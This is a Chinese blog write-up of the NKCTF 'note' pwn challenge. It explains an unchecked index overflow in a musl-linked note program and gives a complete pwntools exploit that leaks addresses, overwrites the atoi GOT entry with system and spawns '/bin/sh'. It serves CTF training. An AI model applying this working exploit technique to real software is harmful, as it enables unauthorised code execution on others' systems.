---
title: nkctf_note
date: 2023-03-29 17:23:02
categories: 
- pwn_wp
tags: 
- pwn
- musl
- index_overflow

---

nkctf的一道题，看到libc是musl的之后没仔细看就跑去学musl了，结果上了大当，这题和musl libc没什么关系。

<!-- more -->

## 查壳

用的musl libc1.2.3。

```sh
musl libc (x86_64)
Version 1.2.3
Dynamic Program Loader
```

当时没注意到`RELRO: Partial RELRO`，也就是说**可以改写GOT表**

```sh
[*] '/home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## 逆向分析

具有增删查改的功能。

首先指定要的操作，然后输入idx

增：堆指针从0x40A0开始，chunk的size可以任意指定，`malloc`后存入`(&ptr)[idx]`，并写入size大小的content。

删：释放idx指定的chunk，并且在对应位置清0。

查：`puts((const char *)(&ptr)[idx])`。

改：向idx指定的chunk写入size大小的content。

存在问题：

- `idx`是`int`类型且没有限制，可以超出堆指针的范围，可以是负数。
- 改的时候没有对`size`进行检测

## 漏洞利用

堆指针在`bss`段，`idx`可以下标溢出写到其他地方。这里写的方法是从`ptr+offset`处取出一个地址`addr`，修改`addr`指向位置的内容。

这里的GOT表可以写，但因为有PIE我们不能直接定位到GOT表，要先想办法泄露地址。

```asm
0x55bccd41c0a0 <ptr>:	0x0000000000000000	0x0000000000000000
0x55bccd41c0b0 <ptr+16>:	0x0000000000000000	0x0000000000000000
0x55bccd41c0c0 <ptr+32>:	0x0000000000000000	0x0000000000000000
0x55bccd41c0d0 <ptr+48>:	0x0000000000000000	0x0000000000000000
0x55bccd41c0e0 <ptr+64>:	0x0000000000000000	0x0000000000000000
0x55bccd41c0f0 <ptr+80>:	0x0000000000000000	0x0000000000000000
0x55bccd41c100 <ptr+96>:	0x0000000000000000	0x0000000000000000
0x55bccd41c110 <ptr+112>:	0x0000000000000000	0x0000000000000000
0x55bccd41c120:	0x000055bcced64018	0x0000ff0000000000
```

可以看到在bss段后面ptr+0x80的位置有一个堆地址0x000055bcced64018，使用`mheap`可以看到他是`active[23]`的一个`meta`：

```asm
active[23] : 0x55bcced64018 (mem: 0x55bccd41c120)
pwndbg> p *(struct meta*)0x55bcced64018
$1 = {
  prev = 0x55bcced64248,
  next = 0x55bcced640e0,
  mem = 0x55bccd41c120, # 与elfbase的偏移是固定的
  avail_mask = 0,
  freed_mask = 1,
  last_idx = 0,
  freeable = 0,
  sizeclass = 23,
  maplen = 0
}

```

而其中的`mem`与程序基地址的偏移是固定的，可以通过它泄露出基地址。

```asm
             Start                End Perm     Size Offset File
    0x55bccd418000     0x55bccd419000 r--p     1000      0 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note
    0x55bccd419000     0x55bccd41a000 r-xp     1000   1000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note
    0x55bccd41a000     0x55bccd41b000 r--p     1000   2000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note
    0x55bccd41b000     0x55bccd41c000 r--p     1000   2000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note
    0x55bccd41c000     0x55bccd41d000 rw-p     1000   3000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note
    0x55bccd41d000     0x55bccd41f000 rw-p     2000   5000 /home/a1ph0nse/PwnPractice/CtfGame/NK/note/nk_note
```

由上我们可以泄露`elfbase`和`heapbase`，为了防止出问题，泄露地址后要把被覆盖的内容恢复。

通过`elfbase`，我们可以定位到`ptr`和前面的`GOT`表，但要改写内容我们还需要知道`libcbase`，这样才知道要将`GOT`表项改写为什么内容。

看了WP才知道，**libc会将小的堆放在bss段中**，因此我们可以申请一个小的堆，在里面写上`GOT`表项的地址，借此泄露出`libcbase`，并改写`GOT`表项`get shell`。

这里选择改写`atoi`为`system`并输入`/bin/sh\x00`来`get shell`

**exp:**

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='nk_note'
elf=ELF('./'+filename)
libc=ELF('./libc.so')
p=process('./'+filename)
#p=process(["qemu-arm","-L","...","-g", "8888", "./"+filename])
#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})
#p=remote('',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    

def add(idx,size,content):
  ru("your choice: ")
  sl("1")
  ru("Index: ")
  sl(str(idx))
  ru("Size: ")
  sl(str(size))
  ru("Content: ")
  s(content)

def edit(idx,size,content):
  ru("your choice: ")
  sl("2")
  ru("Index: ")
  sl(str(idx))
  ru("Size: ")
  sl(str(size))
  ru("Content: ")
  s(content)

def free(idx):
  ru("your choice: ")
  sl("3")
  ru("Index: ")
  sl(str(idx))

def show(idx):
  ru("your choice: ")
  sl("4")
  ru("Index: ")
  sl(str(idx))


# leak heapbase
show(16)
heapaddr=uu64(ru('\n')[:-1])
leak("heapaddr",hex(heapaddr))
heapbase=heapaddr-0x248
leak("heapbase",hex(heapbase))

# leak elfbase
paylooad=b'a'*0x10
edit(16,0x10,paylooad)
show(16)
ru(b'a'*0x10)
elfbase=uu64(ru('\n')[:-1])-0x4120
leak("elfbase",hex(elfbase))

# recover the meta
payload=p64(heapaddr)+p64(heapbase+0xe0)
edit(16,0x10,payload)

ptr_addr=elfbase+0x40A0
leak("ptr_addr",hex(ptr_addr))

# note_addr=ptr+0x2f10
note_addr=ptr_addr+0x2f10
leak("note_addr",hex(note_addr))

atoi_got=elfbase+elf.got['atoi']
leak("atoi_got",hex(atoi_got))
payload=p64(atoi_got)+b'a'*0x28
add(0,0x30,payload)

# offset=0x2f10/0x8=0x5e2
# leak libc
show(0x5e2)
libc_addr=uu64(ru('\n')[:-1])
leak("libc_addr",hex(libc_addr))
libcbase=libc_addr-libc.sym['atoi']
leak("libcbase",hex(libcbase))

sys_addr=libcbase+libc.sym['system']
# get shell
payload=p64(sys_addr)
edit(0x5e2,0x8,payload)

r()
s("/bin/sh\x00")
# debug()

itr()
```



